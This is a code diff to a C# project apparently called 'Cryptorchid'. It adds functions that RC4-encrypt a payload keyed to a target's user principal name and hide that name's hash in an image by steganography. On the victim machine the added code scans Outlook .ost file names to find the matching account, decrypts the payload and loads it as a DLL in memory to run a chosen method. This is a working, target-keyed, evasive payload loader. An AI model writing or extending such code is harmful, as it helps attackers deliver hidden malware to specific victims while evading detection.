@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
 using System.Drawing;
 using System.Drawing.Imaging;
@@ -6,6 +7,7 @@ using System.IO;
 using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
+using System.Text.Json;
 using System.Threading.Tasks;
 
 namespace Cryptorchid
@@ -58,6 +60,73 @@ namespace Cryptorchid
             string finalImageFilePath = Path.Combine(Path.GetDirectoryName(imageFilePath), Path.GetFileNameWithoutExtension(imageFilePath) + "_copy" + Path.GetExtension(imageFilePath));
             bitmap.Save(finalImageFilePath, ImageFormat.Png);
         }
+        public static void UPNEncrypt(string inputFilePath, string imageFilePath, string upn)
+        {
+            // Hash the UPN
+            string hashedUPN = SteganographyHelper.GetSha256Hash(upn);
+
+            // Hide the hashed UPN in the image
+            SteganographyHelper.HideUPNInImage(imageFilePath, upn);
+            Console.WriteLine($"UPN: {upn} has been hashed and hidden in {imageFilePath}");
+            Console.WriteLine($"Hashed UPN: {hashedUPN}");
+
+            // Encrypt the file and base64 encode the result into mod.txt
+            Encrypt.ExEncrypt(inputFilePath, upn);
+        }
+
+        public static void UPNDecrypt(string imageFilePath, string loadMethodSignature)
+        {
+            // Extract the hashed UPN from the image
+            string extractedHash = RetrieveUPNFromImage(imageFilePath);
+            Console.WriteLine($"Extracted Hash: {extractedHash}");
+
+            // Read the base64 encoded encrypted data from mod.txt
+            string base64Encrypted = File.ReadAllText("mod.txt");
+            byte[] encryptedBytes = Convert.FromBase64String(base64Encrypted);
+
+            // List all accounts and check for matching hash
+            string outlookFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Outlook");
+            if (!Directory.Exists(outlookFolder))
+            {
+                Console.WriteLine("Outlook directory not found.");
+                return;
+            }
+
+            string[] ostFiles = Directory.GetFiles(outlookFolder, "*.ost");
+            if (ostFiles.Length == 0)
+            {
+                Console.WriteLine("No .ost files found in the Outlook directory.");
+                return;
+            }
+
+            foreach (string ostFile in ostFiles)
+            {
+                string upn = Path.GetFileNameWithoutExtension(ostFile);
+                string hashedUpn = GetSha256Hash(upn);
+
+                if (hashedUpn.StartsWith(extractedHash))
+                {
+                    // Decrypt the data using the hashed UPN as the key
+                    byte[] keyBytes = Encoding.ASCII.GetBytes(upn);
+                    byte[] decryptedBytes = new byte[encryptedBytes.Length];
+                    Encrypt.RC4EncryptDecrypt(keyBytes, encryptedBytes, decryptedBytes);
+
+                    // Load the DLL from the decrypted bytes in memory and invoke the specified method
+                    try
+                    {
+                        Load.InvokeMethodFromDecryptedData(decryptedBytes, loadMethodSignature);
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"Error invoking method: {ex.Message}");
+                    }
+                    return;
+                }
+            }
+
+            Console.WriteLine("Failed to find a matching UPN hash.");
+        }
+
 
         public static string RetrieveUPNFromImage(string imageFilePath)
         {
